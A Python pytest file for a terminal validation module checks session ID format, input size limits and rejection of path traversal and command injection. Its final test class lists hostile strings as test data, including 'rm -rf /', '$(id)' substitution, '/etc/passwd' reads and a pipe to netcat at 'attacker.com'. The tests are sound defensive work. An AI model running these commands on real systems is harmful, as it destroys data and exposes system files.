"""Tests for terminal input validation."""

import pytest

from ras.terminal.validation import (
    MAX_INPUT_SIZE,
    RATE_LIMIT_PER_SECOND,
    SESSION_ID_PATTERN,
    ValidationError,
    validate_input_data,
    validate_session_id,
)


class TestValidationConstants:
    """Test validation-related constants."""

    def test_max_input_size_is_64kb(self):
        """Max input size should be 64KB."""
        assert MAX_INPUT_SIZE == 65536

    def test_rate_limit_is_100_per_second(self):
        """Rate limit should be 100 per second."""
        assert RATE_LIMIT_PER_SECOND == 100

    def test_session_id_pattern_is_12_alphanumeric(self):
        """Session ID pattern should match 12 alphanumeric chars."""
        assert SESSION_ID_PATTERN.match("abc123def456")
        assert SESSION_ID_PATTERN.match("ABCDEF123456")
        assert not SESSION_ID_PATTERN.match("abc123")  # too short
        assert not SESSION_ID_PATTERN.match("abc-123-def")  # has dashes


class TestValidationError:
    """Test the ValidationError dataclass."""

    def test_validation_error_has_code_and_message(self):
        """ValidationError should store code and message."""
        err = ValidationError("TEST_CODE", "Test message")
        assert err.code == "TEST_CODE"
        assert err.message == "Test message"


class TestValidateSessionId:
    """Test the validate_session_id function."""

    # Valid session IDs
    def test_valid_lowercase_alphanumeric(self):
        """Valid lowercase alphanumeric session ID."""
        assert validate_session_id("abc123def456") is None

    def test_valid_uppercase_alphanumeric(self):
        """Valid uppercase alphanumeric session ID."""
        assert validate_session_id("ABCDEF123456") is None

    def test_valid_mixed_case(self):
        """Valid mixed case session ID."""
        assert validate_session_id("AbC123DeF456") is None

    def test_valid_all_digits(self):
        """Valid all-digits session ID."""
        assert validate_session_id("123456789012") is None

    def test_valid_all_letters(self):
        """Valid all-letters session ID."""
        assert validate_session_id("abcdefghijkl") is None

    # Invalid - empty
    def test_empty_session_id(self):
        """Empty session ID should fail."""
        err = validate_session_id("")
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"
        assert "required" in err.message.lower()

    # Invalid - wrong length
    def test_too_short_session_id(self):
        """Too short session ID should fail."""
        err = validate_session_id("abc123")
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"

    def test_too_long_session_id(self):
        """Too long session ID should fail."""
        err = validate_session_id("abc123def456789")
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"

    # Invalid - path traversal
    def test_path_traversal_double_dot(self):
        """Path traversal with .. should fail."""
        err = validate_session_id("../../../etc")
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"
        assert "invalid" in err.message.lower()

    def test_path_traversal_slash(self):
        """Path traversal with / should fail."""
        err = validate_session_id("/etc/passwd")
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"

    def test_path_traversal_embedded(self):
        """Embedded .. in session ID should fail."""
        err = validate_session_id("abc..def456")
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"

    # Invalid - null byte
    def test_null_byte_embedded(self):
        """Embedded null byte should fail."""
        err = validate_session_id("abc\x00def456")
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"

    # Invalid - special characters
    def test_dash_in_session_id(self):
        """Dash in session ID should fail."""
        err = validate_session_id("abc-123-def")
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"

    def test_underscore_in_session_id(self):
        """Underscore in session ID should fail."""
        err = validate_session_id("abc_123_def_")
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"

    def test_space_in_session_id(self):
        """Space in session ID should fail."""
        err = validate_session_id("abc 123 def ")
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"

    def test_special_char_in_session_id(self):
        """Special character in session ID should fail."""
        err = validate_session_id("abc123def45!")
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"

    def test_newline_in_session_id(self):
        """Newline in session ID should fail."""
        err = validate_session_id("abc123def45\n")
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"


class TestValidateInputData:
    """Test the validate_input_data function."""

    # Valid inputs
    def test_valid_simple_text(self):
        """Simple text should pass."""
        assert validate_input_data(b"hello") is None

    def test_valid_empty_data(self):
        """Empty data should pass."""
        assert validate_input_data(b"") is None

    def test_valid_single_byte(self):
        """Single byte should pass."""
        assert validate_input_data(b"\r") is None

    def test_valid_escape_sequence(self):
        """Escape sequence should pass."""
        assert validate_input_data(b"\x1b[A") is None

    def test_valid_medium_text(self):
        """Medium-sized text should pass."""
        assert validate_input_data(b"x" * 1000) is None

    def test_valid_binary_data(self):
        """Binary data should pass."""
        assert validate_input_data(b"\x00\x01\x02\x03") is None

    def test_valid_unicode_data(self):
        """Unicode data should pass."""
        assert validate_input_data("こんにちは".encode("utf-8")) is None

    def test_valid_at_max_size(self):
        """Data at max size should pass."""
        assert validate_input_data(b"x" * MAX_INPUT_SIZE) is None

    # Invalid - too large
    def test_just_over_max_size(self):
        """Data just over max size should fail."""
        err = validate_input_data(b"x" * (MAX_INPUT_SIZE + 1))
        assert err is not None
        assert err.code == "INPUT_TOO_LARGE"

    def test_way_over_max_size(self):
        """Data way over max size should fail."""
        err = validate_input_data(b"x" * 100000)
        assert err is not None
        assert err.code == "INPUT_TOO_LARGE"
        assert str(MAX_INPUT_SIZE) in err.message


class TestSecurityVectors:
    """Security-focused validation tests."""

    @pytest.mark.parametrize(
        "session_id",
        [
            "../../../etc/passwd",
            "/etc/passwd",
            "abc\x00def456",
            "abc; rm -rf /",
            "abc`id`def456",
            "abc$(id)def456",
            "abc\nrm -rf /",
        ],
    )
    def test_command_injection_in_session_id_rejected(self, session_id):
        """Command injection attempts in session ID should be rejected."""
        err = validate_session_id(session_id)
        assert err is not None
        assert err.code == "INVALID_SESSION_ID"

    @pytest.mark.parametrize(
        "data,expected_valid",
        [
            # These should be ALLOWED - they're sent literally to tmux
            (b"; rm -rf /", True),
            (b"&& cat /etc/passwd", True),
            (b"| nc attacker.com 1234", True),
            (b"`id`", True),
            (b"$(whoami)", True),
            (b"\n rm -rf /", True),
            (b"\x00; id", True),
        ],
    )
    def test_command_injection_in_input_allowed(self, data, expected_valid):
        """Command injection attempts in input data should be allowed.

        Input is sent literally via tmux send-keys -l, so shell metacharacters
        are not interpreted. The terminal receives them as literal text.
        """
        err = validate_input_data(data)
        if expected_valid:
            assert err is None
        else:
            assert err is not None

    @pytest.mark.parametrize("size", [100000, 1000000])
    def test_oversized_input_rejected(self, size):
        """Oversized inputs should be rejected."""
        err = validate_input_data(b"x" * size)
        assert err is not None
        assert err.code == "INPUT_TOO_LARGE"
